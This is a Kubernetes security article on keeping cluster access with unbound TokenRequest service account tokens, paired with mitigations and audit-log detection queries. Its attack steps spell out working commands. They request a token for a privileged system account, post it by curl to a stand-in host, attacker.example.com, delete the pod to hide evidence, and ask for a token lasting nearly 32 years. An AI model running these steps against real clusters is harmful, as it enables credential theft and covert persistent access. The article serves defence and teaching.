---
title: Persistence via Unbound Service Account Tokens
description: Using unbound tokens from the TokenRequest API to maintain cluster access after deleting the attacking pod
category: offensive
createdAt: 2026-04-14
impact: >-
  An attacker can request an unbound token for a privileged service account, delete the attacking pod to eliminate the only visible in-cluster artifact, and continue using the token from outside the cluster until it expires. The token is not tied to any pod lifecycle and leaves no persistent object in etcd. Detection relies entirely on audit logs.
mitigation:
  - Alert on TokenRequest audit events where the request body has no boundObjectRef and the target service account differs from the requester's own account.
  - Set --service-account-max-token-expiration on the API server to cap the maximum lifetime of all issued tokens, preventing attackers from requesting tokens valid for years.
  - Restrict create on serviceaccounts/token using resourceNames so roles can only target named service accounts.
  - Correlate TokenRequest events with pod deletion events in a short time window to detect the retrieve-and-delete pattern.
mitreTechniques:
  - T1550.001
  - T1078
  - T1528
tools:
  - kubectl
  - curl
references: |
  - [Privilege Escalation via serviceaccounts/token Permission](/topics/privilege-escalation-via-serviceaccount-token-creation)
  - [Detecting and Restricting Service Account Token Generation](/topics/detecting-restricting-serviceaccount-token-generation)
  - [Attacker persistence in Kubernetes using the TokenRequest API](https://securitylabs.datadoghq.com/articles/kubernetes-tokenrequest-api/)
  - [Kubernetes TokenRequest API](https://kubernetes.io/docs/reference/kubernetes-api/authentication-resources/token-request-v1/)
---

The TokenRequest API accepts an optional `boundObjectRef` field that ties the token to a pod. When that pod is deleted, the token dies. When `boundObjectRef` is omitted, the token is unbound and survives independently until it expires.

An attacker with `create` on `serviceaccounts/token` can request an unbound token for a privileged service account, exfiltrate it, then delete their pod. The token remains valid from outside the cluster. No workload, no Secret, no object in etcd. The only trace is an audit log entry.

## Why unbound tokens persist

The `TokenRequest` spec accepts an optional `boundObjectRef` that ties the token to a pod. When present, the API server validates that the bound pod still exists on each authentication attempt. When the bound pod is deleted, the token is invalidated. When `boundObjectRef` is omitted, the token is independent of any in-cluster object and the API server has no object to check. The token survives for the full `expirationSeconds` duration.

An unbound token request omits `boundObjectRef` entirely:

```json
{
  "apiVersion": "authentication.k8s.io/v1",
  "kind": "TokenRequest",
  "spec": {
    "expirationSeconds": 3600
  }
}
```

After the attacking pod is deleted, the unbound token continues to authenticate. The API server returns a **403 Forbidden** response, which means the credential was accepted and RBAC was evaluated. The identity is recognized and the token is alive. Only the specific action was denied by RBAC:

```bash
# Unbound token after pod deletion
curl -sk https://<apiserver>/api/v1/namespaces/<namespace>/pods \
  -H "Authorization: Bearer <unbound-token>"
```

```output
{
  "kind": "Status",
  "code": 403,
  "message": "pods is forbidden: User \"system:serviceaccount:kube-system:replicaset-controller\" cannot list resource \"pods\" in API group \"\" in the namespace \"default\""
}
```

For comparison, a bound token (with `boundObjectRef`) would return **401 Unauthorized** after the bound pod is deleted. The token itself is rejected before reaching authorization. The invalidation is delayed by approximately 10 to 15 seconds due to a hardcoded token authentication cache in the kube-apiserver. The success cache TTL is 10 seconds, set in `pkg/kubeapiserver/options/authentication.go`. On a cache hit the bound pod existence check is bypassed entirely. After the cache expires, additional informer lag may add a few seconds before the pod lookup sees the deletion. This cache TTL is not configurable via CLI flags for the core kube-apiserver. Despite this delay, the bound token is eventually dead. An unbound token has no such dependency and survives until its `exp` claim.

## RBAC permissions required

The attacker needs only `create` on `serviceaccounts/token` in the target namespace:

```yaml
rules:
  - apiGroups: [""]
    resources: ["serviceaccounts/token"]
    verbs: ["create"]
```

This is the same permission used in [Privilege Escalation via serviceaccounts/token Permission](/topics/privilege-escalation-via-serviceaccount-token-creation). When the RBAC rule does not include `resourceNames`, the attacker can target every service account in the namespace, not just their own.

No `get` on `serviceaccounts`, no `create` on `pods` (after the initial pod is running), and no access to `secrets` are required. The TokenRequest API does not create a Secret object. The token is returned in the API response body only.

## The attack sequence

### Step 1: Request an unbound token from inside the attacking pod

The attacker uses the pod's auto-mounted service account credential to call the TokenRequest API. The target in this example is `replicaset-controller` in `kube-system`, which is bound to the `system:controller:replicaset-controller` ClusterRole and holds cluster-wide pod creation and deletion permissions. The request omits `boundObjectRef` so the resulting token is unbound:

```bash
APISERVER="https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}"
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt

curl -s -X POST \
  "${APISERVER}/api/v1/namespaces/kube-system/serviceaccounts/replicaset-controller/token" \
  --cacert "${CACERT}" \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"apiVersion":"authentication.k8s.io/v1","kind":"TokenRequest","spec":{"expirationSeconds":3600}}' \
  | jq -r '.status.token' > /tmp/persist-token
```

### Step 2: Exfiltrate the token to an external location

The token is sent to an attacker controlled endpoint outside the cluster. Once exfiltrated, the token can be used from anywhere that can reach the API server:

```bash
curl -s -X POST https://attacker.example.com/collect \
  -d "token=$(cat /tmp/persist-token)"
```

### Step 3: Delete the attacking pod to remove in-cluster evidence

The pod can be deleted by the attacker via the API using the unbound token itself (if the target service account has pod delete permissions), by a separate process, or by letting a Job complete naturally. After deletion there is no running workload belonging to the attacker:

```bash
kubectl delete pod attacker-pod -n production
```

### Step 4: Continue accessing the cluster externally using the exfiltrated token

The attacker authenticates to the API server from outside the cluster using the unbound token. The API server accepts the credential because the token was never tied to the deleted pod:

```bash
curl -sk https://<apiserver>:6443/api/v1/namespaces/default/pods \
  -H "Authorization: Bearer $(cat persist-token)"
```

At this point the cluster has no running pod belonging to the attacker, no Secret containing the token, and no persistent object in etcd. ServiceAccount token rotation does not invalidate the stolen credential because the token was issued by the TokenRequest API, not stored as a Secret. The only artifact is a single audit log entry from Step 1.

## Maximizing token lifetime

When `--service-account-max-token-expiration` is not set on the API server, there is no ceiling on `expirationSeconds`. An attacker can request a token valid for years:

```json
{
  "apiVersion": "authentication.k8s.io/v1",
  "kind": "TokenRequest",
  "spec": {
    "expirationSeconds": 999999999
  }
}
```

The resulting token is signed by the API server's private key and cannot be revoked. It remains valid until its `exp` claim regardless of any changes to RBAC bindings, pod state, or service account rotation.

Setting `--service-account-max-token-expiration` caps all issued tokens regardless of what the caller requests:

```bash
kube-apiserver --service-account-max-token-expiration=3600 ...
```

With this flag set to one hour, requesting 999999999 seconds still produces a token that expires in one hour. Some managed Kubernetes distributions enforce their own limits. AWS EKS limits the maximum token lifetime to 24 hours. Azure AKS and Google GKE apply their own defaults as well.

## Why this is a distinct technique

The privilege escalation documented in [Privilege Escalation via serviceaccounts/token Permission](/topics/privilege-escalation-via-serviceaccount-token-creation) focuses on acquiring a more privileged identity using the `serviceaccounts/token` subresource. That technique describes how the token is obtained. This technique describes what happens after: the attacker uses an unbound token to maintain access with no in-cluster footprint.

| Aspect | Privilege escalation | Unbound token persistence |
| --- | --- | --- |
| Goal | Acquire a privileged identity | Maintain access without in-cluster presence |
| Evidence in cluster | Running pod | None after pod deletion |
| Detection surface | Running workloads + audit log | Audit log only |
| Mitigation priority | Restrict token creation permissions | Cap token lifetime, alert on unbound requests |

The key differentiator is the absence of `boundObjectRef`. A request without `boundObjectRef` where the target service account differs from the requester is the signal that distinguishes persistence from normal token usage.

## Detection

At `Metadata` audit level, the TokenRequest entry looks identical whether the token is bound or unbound. The `boundObjectRef` field is part of the request body, which is only captured at `Request` or `RequestResponse` level. At `Metadata` level the audit log records who requested the token and which service account was targeted, but not whether the token was bound.

To detect unbound token requests, configure the audit policy to log `serviceaccounts/token` at `Request` level:

```yaml
apiVersion: audit.k8s.io/v1
kind: Policy
rules:
  - level: Request
    resources:
      - group: ""
        resources: ["serviceaccounts/token"]
        verbs: ["create"]
```

This captures the `requestObject` field containing the full `TokenRequest` spec. Filter for requests where `requestObject.spec.boundObjectRef` is absent:

```bash
kubectl logs kube-apiserver-<node> -n kube-system \
  | grep '"subresource":"token"' \
  | grep '"verb":"create"' \
  | jq 'select(.requestObject.spec.boundObjectRef == null) |
    "\(.user.username) -> \(.objectRef.namespace)/\(.objectRef.name) (unbound)"'
```

```output
system:serviceaccount:production:attacker-sa -> kube-system/replicaset-controller (unbound)
```

A secondary signal is a pod deletion event shortly after a TokenRequest, which can be correlated by timestamp:

```bash
kubectl logs kube-apiserver-<node> -n kube-system \
  | grep '"verb":"delete"' \
  | grep '"resource":"pods"' \
  | jq '"\(.stageTimestamp) \(.user.username) deleted \(.objectRef.namespace)/\(.objectRef.name)"'
```

Correlating these two event types within a short time window identifies the retrieve and delete pattern characteristic of this technique. Note that in managed Kubernetes distributions the cluster operator may not be able to change the audit policy and may need to work with the provider to enable the required logging level.
